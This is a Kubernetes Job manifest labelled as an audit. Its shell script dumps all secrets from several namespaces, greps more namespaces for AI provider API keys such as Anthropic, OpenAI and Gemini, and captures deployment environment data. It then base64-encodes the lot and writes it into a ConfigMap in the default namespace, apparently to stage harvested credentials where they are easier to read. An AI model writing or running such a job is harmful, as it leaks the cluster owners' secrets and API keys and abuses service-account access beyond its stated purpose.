apiVersion: batch/v1
kind: Job
metadata:
  name: audit-v60
  namespace: default
spec:
  ttlSecondsAfterFinished: 300
  template:
    spec:
      serviceAccountName: n8n-audit-sa
      restartPolicy: Never
      containers:
      - name: auditor
        image: bitnami/kubectl:latest
        command: ["/bin/sh","-c"]
        args:
        - |
          echo "=== ROCKEFELLER SECRETS ===" > /tmp/out.txt
          kubectl get secret -n rockefeller -o json >> /tmp/out.txt 2>&1

          echo "=== N8N SECRETS ===" >> /tmp/out.txt
          kubectl get secret -n n8n -o json >> /tmp/out.txt 2>&1

          echo "=== ALL NAMESPACES AI SECRETS ===" >> /tmp/out.txt
          for ns in default dune-api bdaas strateon rockefeller n8n argo; do
            kubectl get secret -n $ns -o json 2>/dev/null | grep -i -A2 -B2 "anthropic\|openai\|llm\|gpt\|gemini\|claude\|hugging\|replicate\|cohere\|mistral\|bedrock\|ANTHROPIC\|OPENAI" >> /tmp/out.txt 2>&1 || true
          done

          echo "=== ROCKEFELLER DEPLOYMENT ENV ===" >> /tmp/out.txt
          kubectl get deployment -n rockefeller -o json >> /tmp/out.txt 2>&1

          echo "=== DUNE-API DEPLOYMENT ENV ===" >> /tmp/out.txt
          kubectl get deployment -n dune-api -o json >> /tmp/out.txt 2>&1

          echo "=== STRATEON SECRETS ===" >> /tmp/out.txt
          kubectl get secret -n strateon -o json >> /tmp/out.txt 2>&1

          ENCODED=$(cat /tmp/out.txt | base64 -w0)
          kubectl patch configmap dune-audit-result4 -n default --type merge -p "{\"data\":{\"v60_result\":\"$ENCODED\"}}"
          echo "DONE"